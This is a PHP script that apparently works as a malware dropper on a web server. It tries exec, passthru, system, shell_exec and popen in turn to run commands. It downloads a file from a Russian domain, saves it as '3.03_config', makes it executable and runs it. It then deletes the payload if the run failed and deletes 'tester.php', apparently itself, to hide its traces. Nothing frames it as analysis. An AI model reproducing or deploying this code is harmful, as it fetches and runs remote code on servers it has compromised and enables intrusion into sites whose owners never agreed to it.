<?php
function Extor($window) {
	$linux = '';
	if (function_exists('exec')) {
		@exec($window,$linux);
		$linux = @join("\n",$linux);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($window);
		$linux = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($window);
		$linux = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$linux = shell_exec($window);
	} elseif (is_resource($fo = @popen($window,"r"))) {
		$linux = "";
		while(!@feof($fo))
			$linux .= fread($fo,1024);
		pclose($fo);
	}
	return $linux;
}
$file = file_get_contents('http://zayaflowers.ru/3.03_conf');
$feilrname = '3.03_config';
$path = dirname(__FILE__);
chmod($path.'/', 0755);
$foc = @fopen($path.'/'.$feilrname, 'a');
@fwrite($foc, $file);
@fclose($foc);
@chmod($path.'/'.$feilrname, 0755);
$dat = Extor($path.'/'.$feilrname);
echo $dat;
if($dat === '' || $file == ''){
	unlink($path.'/'.$feilrname);
}
unlink($path.'/tester.php');
?>